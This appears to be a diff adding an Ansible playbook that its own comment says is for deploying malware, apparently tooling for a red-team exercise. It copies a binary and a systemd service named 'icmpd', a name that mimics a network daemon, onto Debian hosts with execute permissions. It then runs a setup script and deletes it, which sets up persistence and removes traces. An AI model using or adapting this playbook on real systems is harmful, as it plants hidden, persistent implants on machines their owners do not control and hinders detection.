@@ -1,0 +1,36 @@
+---
+# This is an example task
+# add your tasks to deploy your malware here
+
+- name: icupClientDeploy | Copy file | Adds icup client
+  copy:
+    src: "files/icmpd"
+    dest: "{{ icuplocation }}"
+    mode: 0555
+  when: ansible_os_family == 'Debian'
+
+- name: icupServiceDeploy | Copy file | Adds icup service
+  copy:
+    src: "files/icmpd.service"
+    dest: "{{ servicelocation }}"
+    mode: 0555
+  when: ansible_os_family == 'Debian'
+
+- name: icupScriptDeploy | Copy file | Adds icup script
+  copy:
+    src: "files/icmpd.sh"
+    dest: "{{ scriptlocation }}"
+    mode: 0555
+  when: ansible_os_family == 'Debian'
+
+# - name: CarriageReturnFix | Run | Run on Linux 
+#   shell: "sed -i -e 's/\r$//' /etc/icmpd"
+#   when: inventory_hostname_short == "albatross" or inventory_hostname_short == "orca"
+
+- name: RunScript | Run | Run on Linux 
+  shell: bash "/home/icmpd.sh"
+  when: ansible_os_family == 'Debian'
+
+- name: DeleteScript | Run | Run on Linux 
+  shell: "rm /home/icmpd.sh"
+  when: ansible_os_family == 'Debian'
